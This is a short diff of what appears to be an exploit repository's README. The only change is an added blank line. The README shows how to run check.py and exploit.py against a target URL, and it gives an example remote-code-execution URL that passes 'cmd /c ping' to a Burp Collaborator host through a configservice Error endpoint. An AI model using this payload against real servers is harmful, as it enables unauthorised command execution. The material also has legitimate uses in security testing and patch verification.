@@ -10,6 +10,7 @@ python3 check.py -u http://127.0.0.1
 python3 exploit.py -u http://127.0.0.1
 ```
 RCE: Going to http://127.0.0.1/configservice/Home/Error?0={cmd}?1={agrs}
+
 Example:
 http://127.0.0.1/configservice/Home/Error?0=cmd?1=/c+ping+-n+5+ajxfqfcjf19sm5popcdh8au6sxynmc.burpcollaborator.net
 # Reference
